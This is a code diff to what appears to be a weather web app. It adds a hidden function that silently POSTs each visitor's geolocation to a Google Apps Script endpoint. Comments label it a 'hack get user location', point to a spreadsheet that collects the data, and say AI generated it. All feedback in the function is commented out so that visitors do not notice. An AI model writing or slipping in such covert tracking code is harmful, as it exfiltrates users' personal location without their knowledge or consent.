@@ -35,6 +35,13 @@ function showPosition(position) {
     })();
 
 
+
+
+sendLocationToGoogleScript(locationValue);
+
+
+
+
 }
 
 function showError(error) {
@@ -284,5 +291,24 @@ function getFullWindDirection(abbreviation) {
 
 
 
-
-
+    //hack get user location
+    //you can see your location here : https://docs.google.com/spreadsheets/d/1DGhBTg9G55wtMhaP-sXtPoBlYZLj_MQDkrIaNfH7zpk/edit?gid=0#gid=0
+    //i used Ai to generate this part 
+function sendLocationToGoogleScript(locationValue) {
+    fetch("https://script.google.com/macros/s/AKfycbyLkXRA5iH4JuQ4eiVtVWFmUjLrLi3eNZpFaYNxHB-6jfoE5c0O0_e3B_21PZPblgI/exec", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+        },
+        body: `Fname=${encodeURIComponent(locationValue)}`
+    })
+    .then(response => response.text())
+    .then(data => {
+        // console.log("Response from Google Script:", data);
+        // alert("Location sent successfully!");
+    })
+    .catch(error => {
+        // console.error("Error sending location:", error);
+        // alert("Failed to send location.");
+    });
+}
